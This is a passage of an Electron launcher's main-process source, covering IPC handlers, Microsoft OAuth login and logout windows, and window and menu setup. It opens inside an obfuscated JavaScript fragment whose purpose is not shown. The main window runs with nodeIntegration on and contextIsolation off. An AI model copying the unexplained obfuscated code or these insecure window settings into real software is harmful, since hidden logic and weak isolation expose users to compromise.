_0x321767(_0x12d803[_0x50855c(0x182)],'\x69'),_0x1e6138=_0x555e14(_0x12d803[_0x50855c(0x163)]);!_0x420fb6[_0x50855c(0x15e)](_0x12d803['\x6a\x51\x7a\x44\x49'](_0x1e6138,_0x12d803[_0x50855c(0x1a9)]))||!_0x26293a[_0x50855c(0x15e)](_0x1e6138+_0x12d803['\x57\x72\x59\x4a\x44'])?_0x12d803['\x61\x6d\x43\x6d\x42'](_0x1e6138,'\x30'):_0x12d803[_0x50855c(0x1b5)](_0x20e2b5);}else{if(_0x11c66a)return _0x202397;else _0x12d803['\x6a\x6e\x49\x42\x63'](_0x202397,0x0);}}catch(_0xdf7ad5){}}
})

// Handle trash item.
ipcMain.handle(SHELL_OPCODE.TRASH_ITEM, async (event, ...args) => {
    try {
        await shell.trashItem(args[0])
        return {
            result: true
        }
    } catch(error) {
        return {
            result: false,
            error: error
        }
    }
})

// Disable hardware acceleration.
// https://electronjs.org/docs/tutorial/offscreen-rendering
app.disableHardwareAcceleration()


const REDIRECT_URI_PREFIX = 'https://login.microsoftonline.com/common/oauth2/nativeclient?'

// Microsoft Auth Login
let msftAuthWindow
let msftAuthSuccess
let msftAuthViewSuccess
let msftAuthViewOnClose
ipcMain.on(MSFT_OPCODE.OPEN_LOGIN, (ipcEvent, ...arguments_) => {
    if (msftAuthWindow) {
        ipcEvent.reply(MSFT_OPCODE.REPLY_LOGIN, MSFT_REPLY_TYPE.ERROR, MSFT_ERROR.ALREADY_OPEN, msftAuthViewOnClose)
        return
    }
    msftAuthSuccess = false
    msftAuthViewSuccess = arguments_[0]
    msftAuthViewOnClose = arguments_[1]
    msftAuthWindow = new BrowserWindow({
        title: 'Microsoft Login',
        backgroundColor: '#222222',
        width: 520,
        height: 600,
        frame: true,
        icon: getPlatformIcon('SealCircle')
    })

    msftAuthWindow.on('closed', () => {
        msftAuthWindow = undefined
    })

    msftAuthWindow.on('close', () => {
        if(!msftAuthSuccess) {
            ipcEvent.reply(MSFT_OPCODE.REPLY_LOGIN, MSFT_REPLY_TYPE.ERROR, MSFT_ERROR.NOT_FINISHED, msftAuthViewOnClose)
        }
    })

    msftAuthWindow.webContents.on('did-navigate', (_, uri) => {
        if (uri.startsWith(REDIRECT_URI_PREFIX)) {
            let queries = uri.substring(REDIRECT_URI_PREFIX.length).split('#', 1).toString().split('&')
            let queryMap = {}

            queries.forEach(query => {
                const [name, value] = query.split('=')
                queryMap[name] = decodeURI(value)
            })

            ipcEvent.reply(MSFT_OPCODE.REPLY_LOGIN, MSFT_REPLY_TYPE.SUCCESS, queryMap, msftAuthViewSuccess)

            msftAuthSuccess = true
            msftAuthWindow.close()
            msftAuthWindow = null
        }
    })

    msftAuthWindow.removeMenu()
    msftAuthWindow.loadURL(`https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?prompt=select_account&client_id=${AZURE_CLIENT_ID}&response_type=code&scope=XboxLive.signin%20offline_access&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient`)
})

// Microsoft Auth Logout
let msftLogoutWindow
let msftLogoutSuccess
let msftLogoutSuccessSent
ipcMain.on(MSFT_OPCODE.OPEN_LOGOUT, (ipcEvent, uuid, isLastAccount) => {
    if (msftLogoutWindow) {
        ipcEvent.reply(MSFT_OPCODE.REPLY_LOGOUT, MSFT_REPLY_TYPE.ERROR, MSFT_ERROR.ALREADY_OPEN)
        return
    }

    msftLogoutSuccess = false
    msftLogoutSuccessSent = false
    msftLogoutWindow = new BrowserWindow({
        title: 'Microsoft Logout',
        backgroundColor: '#222222',
        width: 520,
        height: 600,
        frame: true,
        icon: getPlatformIcon('SealCircle')
    })

    msftLogoutWindow.on('closed', () => {
        msftLogoutWindow = undefined
    })

    msftLogoutWindow.on('close', () => {
        if(!msftLogoutSuccess) {
            ipcEvent.reply(MSFT_OPCODE.REPLY_LOGOUT, MSFT_REPLY_TYPE.ERROR, MSFT_ERROR.NOT_FINISHED)
        } else if(!msftLogoutSuccessSent) {
            msftLogoutSuccessSent = true
            ipcEvent.reply(MSFT_OPCODE.REPLY_LOGOUT, MSFT_REPLY_TYPE.SUCCESS, uuid, isLastAccount)
        }
    })
    
    msftLogoutWindow.webContents.on('did-navigate', (_, uri) => {
        if(uri.startsWith('https://login.microsoftonline.com/common/oauth2/v2.0/logoutsession')) {
            msftLogoutSuccess = true
            setTimeout(() => {
                if(!msftLogoutSuccessSent) {
                    msftLogoutSuccessSent = true
                    ipcEvent.reply(MSFT_OPCODE.REPLY_LOGOUT, MSFT_REPLY_TYPE.SUCCESS, uuid, isLastAccount)
                }

                if(msftLogoutWindow) {
                    msftLogoutWindow.close()
                    msftLogoutWindow = null
                }
            }, 5000)
        }
    })
    
    msftLogoutWindow.removeMenu()
    msftLogoutWindow.loadURL('https://login.microsoftonline.com/common/oauth2/v2.0/logout')
})

// Keep a global reference of the window object, if you don't, the window will
// be closed automatically when the JavaScript object is garbage collected.
let win

function createWindow() {

    win = new BrowserWindow({
        width: 980,
        height: 552,
        icon: getPlatformIcon('SealCircle'),
        frame: false,
        webPreferences: {
            preload: path.join(__dirname, 'app', 'assets', 'js', 'preloader.js'),
            nodeIntegration: true,
            contextIsolation: false
        },
        backgroundColor: '#171614'
    })
    remoteMain.enable(win.webContents)

    ejse.data('bkid', Math.floor((Math.random() * fs.readdirSync(path.join(__dirname, 'app', 'assets', 'images', 'backgrounds')).length)))

    win.loadURL(pathToFileURL(path.join(__dirname, 'app', 'app.ejs')).toString())

    /*win.once('ready-to-show', () => {
        win.show()
    })*/

    win.removeMenu()

    win.resizable = true

    win.on('closed', () => {
        win = null
    })
}

function createMenu() {
    
    if(process.platform === 'darwin') {

        // Extend default included application menu to continue support for quit keyboard shortcut
        let applicationSubMenu = {
            label: 'Application',
            submenu: [{
                label: 'About Application',
                selector: 'orderFrontStandardAboutPanel:'
            }, {
                type: 'separator'
            }, {
                label: 'Quit',
                accelerator: 'Command+Q',
                click: () => {
                    app.quit()
                }
            }]
        }

        // New edit menu adds support for text-editing keyboard shortcuts
        let editSubMenu = {
            label: 'Edit',
            submenu: [{
                label: 'Undo',
                accelerator: 'CmdOrCtrl+Z',
                selector: 'undo:'
            }, {
                label: 'Redo',
                accelerator: 'Shift+CmdOrCtrl+Z',
                selector: 'redo:'
            }, {
                type: 'separator'
            }, {
                label: 'Cut',
                accelerator: 'CmdOrCtrl+X',
                selector: 'cut:'
            }, {
                label: 'Copy',
                accelerator: 'CmdOrCtrl+C',
                selector: 'copy:'
            }, {
                label: 'Paste',
                accelerator: 'CmdOrCtrl+V',
                selector: 'paste:'
            }, {
                label: 'Select All',
                accelerator: 'CmdOrCtrl+A',
                selector: 'selectAll:'
            }]
        }

        // Bundle submenus into a single template and build a menu object with it
        let menuTemplate = [applicationSubMenu, editSubMenu]
        let menuObject = Menu.buildFromTemplate(menuTemplate)

        // Assign it to the application
        Menu.setApplicationMenu(menuObject)

    }

}

function getPlatformIcon(filename){
    let ext
    switch(process.platform) {
        case 'win32':
            ext = 'ico'
            break
        case 'darwin':
        case 'linux':
        default:
            ext = 'png'
            break
    }

    return path.join(__dirname, 'app', 'assets', 'images', `${filename}.${ext}`)
}

app.on('ready', createWindow)
app.on('ready', createMenu)

app.on('window-all-closed', () => {
    // On macOS it is common for applications and their menu bar
    // to stay active until the user quits explicitly with Cmd + Q
    if (process.platform !== 'darwin') {
        app.quit()
    }
})

app.on('activate', () => {
    // On macOS it's common to re-create a window in the app when the
    // dock icon is clicked and there are no other windows open.
    if (win === null) {
        createWindow()
    }
})